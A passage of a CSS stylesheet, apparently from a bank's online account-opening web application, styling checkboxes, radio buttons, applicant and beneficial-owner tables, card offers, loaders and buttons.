        position: relative;
        top: -10px;
        padding: 10px;
    }

#gov-stuff .checkbox-container label.content, #gov-stuff-coapp .checkbox-container label.content {
    display: inline;
    position: relative;
    top: -10px;
    padding: 10px;
}

.custom-checkbox + label {
    background-color: rgb(255, 255, 255);
    border: 1px solid rgb(204, 204, 204);
    border-radius: 4px;
    padding: 16px;
    display: inline-block;
    position: relative;
    cursor: pointer;
}



.custom-checkbox:checked + label {
    background-color: rgb(0, 41, 77);
    border: 1px solid rgb(0, 41, 77);
    color: #99a1a7;
}

    .custom-checkbox:checked + label:after {
        color: rgb(255, 255, 255);
        font-family: "olb-icons";
        content: '\e010';
        width: 16px;
        height: 16px;
        left: 8px;
        top: 7px;
        position: absolute;
        background: rgb(0, 41, 77);
        font-size: 18px;
    }

.disabled.custom-checkbox:checked + label {
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0.33);
    opacity: 0.33;
}

/* Terms and Conditions Checks */

input[type=checkbox].tc-link {
    visibility: hidden;
}

    input[type=checkbox].tc-link:after {
        content: " ";
        display: inline-block;
        margin-left: 10px;
        color: green;
        visibility: visible;
        border: 0;
    }

    input[type=checkbox].tc-link:checked:after {
        color: rgb(23, 136, 23);
        content: "\e010";
        font-family: "olb-icons";
        position: relative;
        top: -3px;
    }


/* Old Fashioned RADIO BUTTONS */

.custom-radio {
    display: inline;
    z-index: -999;
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0);
    opacity: 0;
    overflow: hidden;
    position: absolute;
    left: -99999px;
}

.radio-container label {
    cursor: pointer;
}

.radio-container {
    display: table;
}

    .radio-container label.control {
        top: 10px;
    }

    .radio-container label.content {
        display: table-cell;
        position: relative;
        padding: 0px 0 10px 10px;
    }

.custom-radio + label {
    -webkit-appearance: none;
    background-color: rgb(255, 255, 255);
    border: 1px solid rgb(204, 204, 204);
    border-radius: 50%;
    padding: 16px;
    display: inline-block;
    position: relative;
    cursor: pointer;
}

.custom-radio:checked + label:after {
    content: ' ';
    width: 16px;
    height: 16px;
    left: 8px;
    top: 8px;
    border-radius: 50px;
    position: absolute;
    background: rgb(0, 41, 77);
    font-size: 32px;
}

.custom-radio:checked + label {
    background-color: rgb(255, 255, 255);
    color: #99a1a7;
    border: 1px solid rgb(204, 204, 204);
}

.custom-radio:focus + label {
    border-color: rgb(0, 41, 77);
}

.custom-radio + label:active, .custom-radio:checked + label:active {
}

.radio-sub-text {
    color: rgb(112, 112, 112);
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    margin: 0px 0 10px 40px;
    padding: 0 5px;
}

 .radio-container-bootstrap{
    display: inline;
    margin-right:5px;
}
    .radio-container-bootstrap label.control {
        top: 10px;
    }

    .radio-container-bootstrap label.bootstrap-content {
        display: inline;
        position: relative;
        padding: 0px 0 10px 10px;
        top: -5px;
    margin-left: 10px;
    }


/* Segmented control on Getting Started page */

.segmented {
    display: block;
    margin-top: 0.5em;
}

    .segmented .label {
        background-color: rgb(244, 244, 244);
        border: 1px #fff;
        border-style: solid none solid solid;
        border-bottom: 1px solid #ccc;
        color: #707070;
        cursor: pointer;
        float: left;
        padding: 8px;
        text-align: center;
        display: block;
        width: 33%;
        max-width: 81px;
        font-size: 1.3rem;
    }

    .segmented.business .label {
        width: 50% !important;
        max-width: 121.5px;
    }

    .segmented .label.fat {
        padding: 8px 12.5px;
    }

    .segmented .label.thin {
        padding: 8px 4px;
    }

    .segmented :first-child .label {
        border-radius: 3px 0 0 0;
    }

    .segmented :last-child .label {
        border-radius: 0 3px 0 0;
        border-right-style: solid;
    }

    .segmented input {
        display: inline;
        z-index: -999;
        filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0);
        opacity: 0;
        overflow: hidden;
        position: absolute;
        left: -99999px;
    }

        .segmented input:checked + .label {
            background-color: #fff;
            color: #333;
            border: 1px solid #ccc;
            border-bottom: 1px solid #fff;
        }

        .segmented input:checked .label {
            padding-top: 10px;
            position: relative;
            top: 1px;
        }



    /* ---------------- */

    .segmented .label {
        background-color: rgb(244, 244, 244);
    }

    .segmented input:checked + span {
        background: #fff;
    }

/* Tutorial modal on Getting Started page */

.web_dialog_overlay {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    height: 100%;
    width: 100%;
    margin: 0;
    padding: 0;
    background: #000;
    opacity: .60;
    filter: alpha(opacity=60);
    -moz-opacity: .60;
    z-index: 9999999999101;
    display: none;
}

.web_dialog {
    display: none;
    position: fixed;
    width: 400px;
    min-height: 400px;
    top: 50%;
    left: 50%;
    margin-left: -200px;
    margin-top: -200px;
    background-color: #fff;
    border: 3px solid #fff;
    border-radius: 4px;
    padding: 20px;
    z-index: 9999999999102;
}


/* authentication section and variants on Getting Started page */

#auth-section.on-top {
    margin: 3em 0 -2em 0;
}


/* Disclosures PDF list and PDF link */

.pdf-content {
}

.pdf-note {
    float: right;
    width: 250px;
    font-style: italic;
    font-size: 1.3rem;
    margin: 0 0 0 0;
    /* background-color: rgb(244, 244, 244); */
    padding: 10px;
    border-radius: 4px;
    color: #C94C06;
}

.disclosure-pdf {
    float: left;
    width: 275px;
}

    .disclosure-pdf ul {
        list-style-type: none;
        margin: 0.5em 0 0 0;
        padding: 0;
    }

    .disclosure-pdf li {
        margin-bottom: 1em;
    }

        .disclosure-pdf li:before, li.pdf-link-bullet:before {
            left: 0;
            content: "\e029";
            font-family: "olb-icons";
            display: inline-block;
            font-weight: normal;
            font-style: normal;
            font-size: 2rem;
            text-decoration: inherit;
            padding-right: .5em;
            color: rgb(187, 7, 6);
        }

a.pdf-link:before {
    content: "\e029";
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    padding: 0 5px 0 4px;
    color: rgb(187, 7, 6);
    white-space: nowrap;
}

li.pdf-link-bullet {
    list-style-type: none;
    padding-top: 1.5em;
    position: relative;
    left: -12px;
}

    li.pdf-link-bullet a {
        position: relative;
        top: -2px;
        font-size: 14px;
    }

.pdfchecked {
    position: relative;
    left: 10px;
    top: -2px;
    transform: rotate(45deg);
    height: 13px;
    width: 8px;
    border-bottom: 3px solid #178817;
    border-right: 3px solid #178817;
}

/* Tax certifications list */


.display-list {
    margin: 1em 0 1em 0;
}

    .display-list li {
        margin-bottom: 1em;
        overflow: visible;
        position: relative;
    }

.tax-id-box {
    display: table;
    background-color: rgb(244, 244, 244);
    width: 100%;
    font-weight: bold;
    padding: 1em 10px;
    border-radius: 4px;
}

    .tax-id-box .name, .tax-id-box .number {
        display: table-cell;
        text-align: center;
    }


/* Lines of Credit Table/List */

.lines-table {
    display: table;
    width: 100%;
}

    .lines-table .row {
        display: table-row;
    }

    .lines-table .cell {
        display: table-cell;
        border-bottom: 1px solid #eee;
        padding: 10px;
    }

    .lines-table .head .cell {
        background: #f5f5f5;
        color: #707070;
    }

    .lines-table .cell.amount,
    .lines-table .cell.last {
        text-align: right;
    }

/* Additional Applicant Table/List */

.additional-applicant-table {
    display: table;
    width: 100%;
}

    .additional-applicant-table .row {
        display: table-row;
    }

    .additional-applicant-table .cell {
        display: table-cell;
        border-bottom: 1px solid #eee;
        padding: 10px;
        padding-left: 0px;
    }

    .additional-applicant-table .head .cell {
        background: #f5f5f5;
        color: #707070;
    }

    .additional-applicant-table .cell.last {
        text-align: right;
        padding-right: 0;
    }

        .additional-applicant-table .cell.last div.input-control {
            width: auto;
        }


/* Beneficial Owner Table/List */

.beneown-table {
    display: table;
    width: 100%;
}

    .beneown-table .row {
        display: table-row;
    }

    .beneown-table .cell {
        display: table-cell;
        border-bottom: 1px solid #eee;
        padding: 10px;
    }

    .beneown-table .head .cell {
        background: #f5f5f5;
        color: #707070;
    }

    .beneown-table .cell.amount,
    .beneown-table .cell.last {
        text-align: left;
    }

/* Responsibility Center Table/List */

.rc-table {
    display: table;
    width: 100%;
}

    .rc-table .row {
        display: table-row;
    }

    .rc-table .cell {
        display: table-cell;
        border-bottom: 1px solid #eee;
        padding: 10px;
    }

    .rc-table .head .cell {
        background: #f5f5f5;
        color: #707070;
    }

    .rc-table .cell.amount,
    .rc-table .cell.last {
        text-align: right;
    }

/* Officer Table/List */

.officer-table {
    display: table;
    width: 100%;
}

    .officer-table .row {
        display: table-row;
    }

    .officer-table .cell {
        display: table-cell;
        border-bottom: 1px solid #eee;
        padding: 10px;
    }

    .officer-table .head .cell {
        background: #f5f5f5;
        color: #707070;
    }

    .officer-table .cell.last {
        text-align: right;
    }


/* Photo ID */
.photoid-container {
    display: table;
    width: 100%;
    padding: 20px 10px;
    background: #eee;
    border-radius: 4px;
    margin-top: -20px;
    margin-bottom: 20px;
}

.photoid-body {
    display: table-cell;
    padding-right: 20px;
}

.photoid-button {
    display: table-cell;
}

.photoid-button {
    text-align: right;
    vertical-align: middle;
    position: relative;
    min-width: 20%;
}

    .photoid-button button {
        background: none repeat scroll 0 0 rgb(0, 56, 113);
        border: medium none;
        border-radius: 4px;
        color: rgb(255, 255, 255);
        cursor: pointer;
        font-size: 16px;
        min-width: 120px;
        padding: 7px 24px;
        text-align: center;
        transition: background 0.15s ease-in 0s;
        outline: none;
    }

        .photoid-button button .camera {
            height: 20px;
            width: 22px;
            margin-top: 2px;
            margin-left: 4px;
            vertical-align: text-top;
            display: inline-block;
            background-image: url( '/nac/images/icon-camera.svg' );
            background-size: contain;
            background-repeat: no-repeat;
            fill: red;
        }

        .photoid-button button:hover, .photoid-button button:focus {
            background: #00294d;
            transition: background 0.05s ease-in 0s;
        }


/* Percent Inputs  */


input[type=text].perc {
    width: 6em;
    text-align: right !important;
    margin-right: -15px;
    padding-right: 26px;
}

input[type=text].perc-full {
    width: 60%;
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: 240px;
    text-align: right !important;
    margin-right: -15px;
    padding-right: 26px;
}

.percent-sign:before {
    content: "\0025";
    color: #aaa;
    font-size: 16px;
}

.percent-sign {
    position: relative;
    display: inline-block;
    padding-top: 0;
    top: 0px;
    left: -10px;
    margin: 0 auto;
}

.percent-sign-bef {
    position: relative;
    display: inline-block;
    padding-top: 0;
    width: 0;
    height: 0;
    left: -20px;
}

    .percent-sign-bef:before {
        content: "\0025";
        display: inline-block;
        top: 0px;
        color: #aaa;
        margin: 0 auto;
    }

.switch-section .input-control.ownership-select input[type=text].perc {
    text-align: right !important;
}


/* Dollar amounts */

.dollar-amount {
    position: relative;
}

    .dollar-amount input[type=text], .dollar-amount input[type=number], .dollar-amount input[type=tel] {
        padding-left: 20px;
    }

    .dollar-amount.leading input[type=text], .dollar-amount.leading input[type=number], .dollar-amount.leading input[type=tel] {
        padding-left: 30px;
    }

.leading .dollar-label:before {
    content: "$0.";
}

.dollar-label:before {
    content: "$";
    color: #aaa;
    font-size: 16px;
}

.dollar-label {
    display: inline-block;
    position: absolute;
    padding-top: 0;
    top: 11px;
    left: 10px;
    color: rgb(51, 51, 51);
    margin: 0 auto;
}

/* Tweak for Firefox to make artifacts align */
@-moz-document url-prefix() {
    .dollar-label {
        top: 10px;
    }
}

/* Tweak for Safari to make artifacts align */
/*\*/
.dollar-label {
    /* some style */
}
/**/






/* Confirmation page ads and cross-sells */


.ad-row {
    display: table;
    margin-top: 2em;
    border-spacing: 10px;
    width: 100%;
}

    .ad-row .display-list-tight {
        display: inline-block;
    }

    .ad-row p {
        display: inline-block;
        width: 100%;
    }

    .ad-row .display-list-tight li {
        margin-bottom: .5em;
        text-align: left;
    }


.ad-container {
    display: table-cell;
    padding: 0 20px 20px 20px;
    background: #f8f1e6;
    border-radius: 4px;
    width: 50%;
}

.two-ads .ad-container {
    width: 50%;
}

.three-ads .ad-container {
    width: 33%;
}

.three-ads .ad-container {
    width: 25%;
}

.ad-row.one-ad {
    display: block;
}

.one-ad .ad-container {
    display: block;
    width: 100%;
    max-width: 400px;
    margin: 0 auto;
}

.ad-graphic, .ad-button {
    text-align: center;
}

h3.ad-title {
    color: #C94C06;
    margin: 0 0 .5em 0;
}

.ad-body {
    min-height: 325px;
    text-align: center;
}

    .ad-body .sub-text, .ad-body .sub-text-row {
        color: #6e6e6e;
    }

.three-ads .ad-body {
    min-height: 375px;
}

.four-ads .ad-body, .card-offer.four-ads .ad-body {
    min-height: 200px;
}

.short-ads .ad-body {
    min-height: 100px !important;
}

.medium-ads .ad-body {
    min-height: 250px !important;
}

.card-offer.four-ads.browser-upgrade .ad-body {
    min-height: 0;
}

.card-offer.four-ads.browser-upgrade h3.ad-title {
    text-align: center;
}

.ad-button .button-ad, .ad-button .button-offer {
    background: none repeat scroll 0 0 #D66112;
    border-radius: 4px;
    box-sizing: border-box;
    color: rgb(255, 255, 255);
    cursor: pointer;
    display: inline-block;
    font: 18px/24px "suntrustregular","Trebuchet MS",sans-serif;
    margin: 20px 0;
    /* padding: 21px 30px; */
    padding: 11px 15px;
    text-align: center;
    transition: background 0.15s ease-in 0s;
    vertical-align: bottom;
    transition: background 0.15s ease-in 0s;
    outline: none;
    border: none;
}

.ad-button .tile-button {
    background: none repeat scroll 0 0 #D66112;
    border-radius: 4px;
    box-sizing: border-box;
    color: #FFFFFF;
    cursor: pointer;
    display: inline-block;
    /* font: 18px/24px "suntrustregular","Trebuchet MS",sans-serif; */
    font-family: suntrustregular;
    font-size: 12px;
    /* margin: 20px 0; */
    /* padding: 21px 30px; */
    /* padding: 11px 15px; */
    text-align: center;
    transition: background 0.15s ease-in 0s;
    vertical-align: bottom;
    transition: background 0.15s ease-in 0s;
    outline: none;
    border: none;
    width: 104px;
    height: 35px;
}

/* Mobile App Download Widget for the Confirmation Page */

.mobile-only-content {
    display: none;
}

.dl-app-link {
    position: relative;
    left: 25px;
}

.dl-app {
    z-index: 999;
    display: inline-block;
    border-radius: 35px 0px 0px 35px;
    width: 223px;
    height: 70px;
    position: fixed;
    bottom: 0px;
    right: 0px;
    margin: 7px;
    margin-right: 0;
    margin-bottom: 20px;
    padding: 14px 8px 12px 5px;
    background: #003871;
    color: white;
    font-weight: bold;
    text-align: left;
    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
    transition: all 0.2s ease;
    display: none; /* Hide at desktop resolution ... */
}

    .dl-app.dl-closed {
        right: -188px;
    }

.dl-app-trigger:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: bold;
    font-style: normal;
    text-decoration: inherit;
    font-size: 2rem;
    line-height: 25px;
    line-height: 2.5rem;
    content: "\e019";
    float: left;
    position: relative;
    top: 6px;
    right: -13px;
    padding: 2px;
    cursor: pointer;
    height: 30px;
    width: 20px;
}

.dl-closed span.dl-app-trigger:before {
    content: "\e030";
    font-family: "olb-icons";
    font-weight: normal;
    font-size: 2.3rem;
    top: 2px;
    right: -1px;
    color: #fff;
    -webkit-transform: rotate(-180deg);
    -moz-transform: rotate(-180deg);
    -ms-transform: rotate(-180deg);
    -o-transform: rotate(-180deg);
    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=6);
}

.dl-app a, .dl-app a:link, .dl-app a:hover, .dl-app a:visited {
    color: #fff;
    text-decoration: none;
}

    .dl-app a:hover {
        text-decoration: underline;
    }


/* 2B (double display) */


.dub-row {
    display: table;
    width: 100%;
    margin-top: 2em;
    border-spacing: 10px;
}


.dub-container {
    display: table-cell;
    width: 50%;
    padding: 20px;
    background-color: rgb(244, 244, 244);
    border-radius: 3px;
}


h3.dub-title {
    color: #333;
    margin: 0 0 .5em 0;
}

/* variations for credit card offers page  */

.ad-row.card-offer {
    margin-top: 0;
    margin-bottom: -10px;
}

.card-offer .ad-container {
    padding: 20px;
    background-color: rgb(244, 244, 244);
}

.card-offer .ad-body {
    min-height: 455px;
    margin-top: 1em;
    text-align: left;
    /*margin-bottom: -60px;*/
}

.card-offer.four-ads .ad-body {
    min-height: 155px;
}

.card-offer h3.ad-title {
    color: #000;
}

.card-offer .ad-button .button-offer {
    background: none repeat scroll 0 0 rgb(0, 56, 113);
    border: medium none;
    border-radius: 4px;
    color: rgb(255, 255, 255);
    cursor: pointer;
    font-size: 16px;
    min-width: 120px;
    padding: 7px 24px;
    text-align: center;
    transition: background 0.15s ease-in 0s;
    outline: none;
}

    .card-offer .ad-button .button-offer:hover, .card-offer .ad-button .button-offer:focus {
        background: #00294d;
        transition: background 0.05s ease-in 0s;
    }



/* Delta SkyMiles Check Card Offer page */
.sky-card-offer {
    width: 100%;
    padding: 10px 10px 0 10px;
}

    .sky-card-offer .sky-card-img {
        float: left;
        width: 35%;
        margin: 10px 0 0 0;
    }

    .sky-card-offer .sky-card-content {
        float: left;
        width: 60%;
        margin-left: 5%;
    }



/* Special rate offer controls */
.offerControl {
    background: #DFFDE5;
    color: #008000;
}

    .offerControl option {
        background: #fff;
        color: #000;
    }

option.offerValue {
    background: #DFFDE5;
    color: #008000;
}

select.offerControl, select.offerControl:focus {
    -webkit-appearance: none;
    -moz-appearance: none;
    text-indent: 0.01px;
    text-overflow: '';
    background: #DFFDE5 !important;
    background-position: 100% 50%;
}


/* Credit Card Selector widget styles (utilizing slick.js, JS/CSS components named "ccc" ) */

.cc-nav #zero {
    margin-right: 10px;
}

    .cc-nav #zero:hover, .cc-nav #one:hover {
        cursor: pointer;
    }


.cc-nav #zero, .cc-nav #one {
    opacity: 0.33;
    filter: alpha(opacity=33); /* For IE8 and earlier */
    border: 0;
}

    .cc-nav #zero.sel, .cc-nav #one.sel {
        /* background:#fff; */
        border: 0;
        opacity: 1;
        filter: alpha(opacity=100); /* For IE8 and earlier */
    }

.card-instructions {
    white-space: nowrap;
    margin-left: 10px;
}

.dual-selector .left-side-display .items {
    width: 300px;
    display: none;
}

.cc-nav {
    width: 300px;
    margin-bottom: 10px;
}

.ccad {
    padding: 20px;
}

.dual-selector {
    margin-top: 10px;
    text-align: left;
}

    .dual-selector .right-side-display {
        display: table-cell;
        width: auto;
        padding-left: 20px;
        padding-top: 0px;
        vertical-align: top;
        color: rgb(112, 112, 112);
        font-size: 14px;
        font-weight: normal;
        line-height: normal;
    }

    .dual-selector.ccad .right-side-display {
        color: #333;
        font-size: 15px;
    }

        .dual-selector.ccad .right-side-display h3 {
            margin: 0 0 1em 0;
            color: #333;
        }

    .dual-selector .right-side-display .radio-container {
        background: red;
    }

    .dual-selector .left-side-display {
        display: table-cell;
        width: 300px;
        vertical-align: top;
        padding: 0 0px;
    }

hr.hrMiddle {
    color: #B4B3B3;
    clear: both;
    width: 100%;
    height: 1px;
    margin: 70px 0;
}


@media (max-width: 480px) {
    /* chandra - 6/14 Start */
    .clickable-div {
        cursor: pointer;
    }

    .button-offers {
        display: block;
    }

    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

        .bootstrap .row-spacing {
            margin-top: 0px;
        }

    .print {
        display: inline-block;
        position: relative;
        margin: 2.8em 0 .5em 0;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
        margin-top: 10px;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }
    /* chandra - 6/14 End */
    .dual-selector .left-side-display .items {
        width: 100%;
        display: block;
    }

    .cc-nav {
        display: none;
    }

    .card-instructions {
        display: none;
    }

    .dual-selector .left-side-display, .dual-selector .right-side-display {
        display: block;
        width: 100%;
    }

    .dual-selector .left-side-display {
        padding: 0 25px;
    }

    .dual-selector .right-side-display {
        padding-top: 20px;
        padding-left: 0;
    }
}


/* Funding box widget styles */

.funding-box {
    background: #f3f3f3;
    border-radius: 4px;
    margin: .5em 0 3em 0;
    padding: 10px 20px 20px 20px;
}


    .funding-box .sub-content {
        display: block;
        padding: 0px 0 15px 0;
        margin-left: 45px;
        color: rgb(112, 112, 112);
        font-size: 14px;
        font-weight: normal;
        line-height: normal;
    }


.funding-row {
}

    .funding-row .radio-container {
        display: table-row;
        width: 25%;
    }


    .funding-row .custom-radio + label.control {
        top: 10px;
    }

    .funding-row .radio-container label.content {
        display: table-cell;
        padding-top: 0;
        width: auto;
        top: 0;
    }

        .funding-row .radio-container label.content .sub-text {
            margin-left: 0;
            padding-left: 0;
        }

/* Divider on Search Page */

.results-divider {
    display: block;
    border-bottom: 3px solid #eee;
    text-align: center;
    margin: 0 0 .5em 0;
    position: relative;
    top: -1.8em;
}

    .results-divider .words {
        color: #C94C06;
        display: inline-block;
        background: #fff;
        position: relative;
        top: 1.9em;
        padding: 10px 10px 20px 10px;
        font-style: italic;
    }


/* Miscellaneous styles */
option.placeholder {
    color: #aaa;
}

.more-options {
    font-style: italic;
    text-align: right;
}

#more-options1 {
    /* display:none; */
}

#more-options2 {
    display: none;
    margin: -20px 0 30px 0;
}

.dar-enfasis {
    font-size: 102%;
    font-weight: bold;
    padding: 0 2px;
    color: #333;
}

/* loader widget styles */

.loader {
    padding: 20px 25px;
    background: #ffffff;
    display: table;
    margin: 40px auto;
    font-size: 0; /* dumb hack to make the whitespace between tags disappear */
}

.loader-indicator {
    display: inline-block;
    height: 30px;
    width: 8px;
    padding: 0;
    margin: 0 5px 0 0;
    background-color: #05457D;
    border-radius: 4px;
}

@keyframes loadingAnimation {
    0% {
        opacity: .1;
    }

    25% {
        opacity: .1;
    }

    33% {
        opacity: .25;
    }

    50% {
        opacity: 1;
    }

    66% {
        opacity: .25;
    }

    75% {
        opacity: .1;
    }

    100% {
        opacity: .1;
    }
}

@-o-keyframes loadingAnimation {
    0% {
        opacity: .1;
    }

    25% {
        opacity: .1;
    }

    33% {
        opacity: .25;
    }

    50% {
        opacity: 1;
    }

    66% {
        opacity: .25;
    }

    75% {
        opacity: .1;
    }

    100% {
        opacity: .1;
    }
}

@-moz-keyframes loadingAnimation {
    0% {
        opacity: .1;
    }

    25% {
        opacity: .1;
    }

    33% {
        opacity: .25;
    }

    50% {
        opacity: 1;
    }

    66% {
        opacity: .25;
    }

    75% {
        opacity: .1;
    }

    100% {
        opacity: .1;
    }
}

@-webkit-keyframes loadingAnimation {
    0% {
        opacity: .1;
    }

    25% {
        opacity: .1;
    }

    33% {
        opacity: .25;
    }

    50% {
        opacity: 1;
    }

    66% {
        opacity: .25;
    }

    75% {
        opacity: .1;
    }

    100% {
        opacity: .1;
    }
}

.loader-indicator {
    opacity: .1;
    -webkit-animation: loadingAnimation 1s infinite;
    -moz-animation: loadingAnimation 1s infinite;
    -o-animation: loadingAnimation 1s infinite;
    animation: loadingAnimation 1s infinite;
}

    .loader-indicator:nth-child(2) {
        -webkit-animation-delay: 0ms;
        -ms-animation-delay: 0ms;
        animation-delay: 0ms;
    }

    .loader-indicator:nth-child(3) {
        -webkit-animation-delay: 125ms;
        -ms-animation-delay: 125ms;
        animation-delay: 125ms;
    }

    .loader-indicator:nth-child(4) {
        -webkit-animation-delay: 250ms;
        -ms-animation-delay: 250ms;
        animation-delay: 250ms;
    }

    .loader-indicator:nth-child(5) {
        -webkit-animation-delay: 375ms;
        -ms-animation-delay: 375ms;
        animation-delay: 375ms;
    }

    .loader-indicator:nth-child(6) {
        -webkit-animation-delay: 500ms;
        -ms-animation-delay: 500ms;
        animation-delay: 500ms;
    }

    .loader-indicator:nth-child(7) {
        -webkit-animation-delay: 625ms;
        -ms-animation-delay: 625ms;
        animation-delay: 625ms;
    }

    .loader-indicator:nth-child(8) {
        -webkit-animation-delay: 750ms;
        -ms-animation-delay: 750ms;
        animation-delay: 750ms;
    }

    .loader-indicator:nth-child(9) {
        -webkit-animation-delay: 875ms;
        -ms-animation-delay: 875ms;
        animation-delay: 875ms;
        margin-right: 0px;
    }


/* check-info styles */

.check-info {
    margin: 0 0 1em 0;
    text-align: center;
}

    .check-info img {
        width: 100%;
        max-width: 530px;
    }


/* rate-table styles */

.rate-table-label {
    margin: 1em 0 0 0;
    font-weight: 700;
}


table.rate-table {
    width: 100%;
    border-collapse: collapse;
    margin-bottom: 2em;
}

.rate-table tr:nth-of-type(odd) {
    background: #f4f4f4;
}

.rate-table th {
    background: #333;
    color: white;
    font-weight: bold;
}

.rate-table td, .rate-table th {
    padding: 6px;
    border: 1px solid #ddd;
    text-align: right;
}

.rate-copy {
    padding: 0 10px 20px 10px;
}
/* title-button styles */

.title-button-row {
}

.title-buttons {
    float: right;
    position: relative;
    top: 25px;
}

.non-title-button-row {
    text-align: right;
    background: none;
    margin-top: -30px;
}

.non-title-buttons {
    display: inline-block;
    position: relative;
    top: 30px;
}

.restore-row {
    display: table;
    width: 100%;
    margin: 0 10px 10px 0;
    background-color: #ffdbdb;
    border-radius: 4px;
    padding-right: 10px;
}

.restore-item {
    display: table-cell;
    padding: 10px;
}

.restore-button {
    display: table-cell;
    text-align: right;
    padding: 10px;
    padding-right: 20px;
}

    .restore-button a {
        text-decoration: underline;
    }

    .restore-button button {
        position: relative;
        left: 10px;
    }

.outline-button, .outline-button:link, .outline-button:active, .outline-button:visited,
.edit-button, .edit-button:link, .edit-button:active, .edit-button:visited,
.delete-button, .delete-button:link, .delete-button:active, .delete-button:visited,
.photo-button, .photo-button:link, .photo-button:active, .photo-button:visited {
    /* padding: 7px 24px; */
    padding: 3px 12px;
    border-radius: 4px;
    text-align: center;
    -webkit-transition: background 0.15s ease-in;
    transition: background 0.15s ease-in;
    cursor: pointer;
    color: #C94C06;
    background: #ffffff;
    border: solid 1px #bdbdbd;
    font-size: 16px;
    font-weight: normal;
    margin-left: 2px;
}

    .photo-button, .photo-button:link, .photo-button:active, .photo-button:visited {
        padding: 3px 6px 0px 6px;
    }

        .outline-button:hover,
        .delete-button:hover,
        .edit-button:hover,
        .photo-button:hover {
            -webkit-transition: border 0.15s ease-in;
            transition: border 0.15 ease-in;
            cursor: pointer;
            text-decoration: none;
            color: #00294d;
            border-color: #00294d;
            background: #fff;
        }

    .delete-button:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e03b";
        color: #999999;
        font-size: 16px;
        font-size: 1.6rem;
        line-height: 16px;
        line-height: 1.6rem;
    }




/* title-button-edit styles */


.title-button-edit {
    float: right;
    position: relative;
    top: 32px;
}



/* Save/Retrieve Button Styles ******* WORKING ******* */
.save-retrieve-buttons {
    text-align: left;
}

.save-button, .save-button:link, .save-button:active, .save-button:visited,
.retrieve-button, .retrieve-button:link, .retrieve-button:active, .retrieve-button:visited {
    /* padding: 7px 24px; */
    padding: 6px 12px;
    border-radius: 4px;
    text-align: center;
    -webkit-transition: background 0.15s ease-in;
    transition: background 0.15s ease-in;
    cursor: pointer;
    color: #777;
    background: #ffffff;
    border: solid 1px #ccc;
    font-size: 16px;
    font-weight: normal;
    margin-left: 2px;
    width: 90%;
}

.save-button {
    margin-bottom: 1em;
}

    .save-button:hover, .retrieve-button:hover {
        -webkit-transition: border 0.15s ease-in;
        transition: border 0.15 ease-in;
        cursor: pointer;
        text-decoration: none;
        color: #00294d;
        border-color: #00294d;
        background: #fff;
    }


/* cloned input styles */
#input_w2, #input_w3, #input_w4, #input_w5, #input_w6, #input_w7, #input_w8, #input_w9, #input_w10,
#input_x2, #input_x3, #input_x4, #input_x5, #input_x6, #input_x7, #input_x8, #input_x9, #input_x10,
#input_y2, #input_y3, #input_y4, #input_y5, #input_y6, #input_y7, #input_y8, #input_y9, #input_y10,
#input_z2, #input_z3, #input_z4, #input_z5, #input_z6, #input_z7, #input_z8, #input_z9, #input_z10 {
    /* background-color: rgb(244, 244, 244); */
    background-color: #fff;
    border-top: 2px dashed #ccc;
}

.clonedInput_w, .clonedInput_x, .clonedInput_y, .clonedInput_z {
    padding: 1em 0 .5em 0;
}

    .clonedInput_x.withTitle {
        padding: 0;
    }

    .clonedInput_w.noLine, .clonedInput_x.noLine, .clonedInput_y.noLine, .clonedInput_z.noLine {
        border-top: 0px solid #ccc !important;
    }

#input_x1.withTitle, #input_x2.withTitle, #input_x3.withTitle, #input_x4.withTitle, #input_x5.withTitle {
    border: 0;
}

/* these are the "+ Add Another" and "- Delete Last" buttons in cloned input sections */

.button-tertiary-inline {
    display: inline-block;
    margin-right: 30px;
    margin-left: 10px;
    position: relative;
    top: 0;
}


.button-secondary-inline:hover,
.button-secondary-inline:active,
.button-secondary-inline:focus {
    text-decoration: none;
    color: #00294d;
    border-color: #00294d;
}

.button-tertiary-inline:hover,
.button-tertiary-inline:active,
.button-tertiary-inline:focus {
    text-decoration: underline;
    color: #00294d;
}

.button-tertiary-inline:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e01a";
    text-decoration: none;
    display: inline-block;
    position: relative;
    top: -3px;
    background-color: #ee6120;
    border-radius: 50%;
    color: #ffffff;
    font-size: 9px;
    text-align: center;
    line-height: 1em;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    padding: 4px;
    margin-right: 5px;
}

.button-tertiary-inline:hover:before,
.button-tertiary-inline:active:before,
.button-tertiary-inline:focus:before {
    background-color: #cc2900;
    text-decoration: none;
}

.button-secondary-inline {
    background: none repeat scroll 0 0 rgb(255, 255, 255);
    border: 1px solid rgb(189, 189, 189);
    border-radius: 4px;
    color: rgb(0, 56, 113);
    cursor: pointer;
    padding: 4px 12px;
    text-align: center;
    transition: background 0.15s ease-in 0s;
    margin-right: 2.5em;
}

.button-inline {
    background: rgb(0, 56, 113);
    border: 0px solid rgb(189, 189, 189);
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
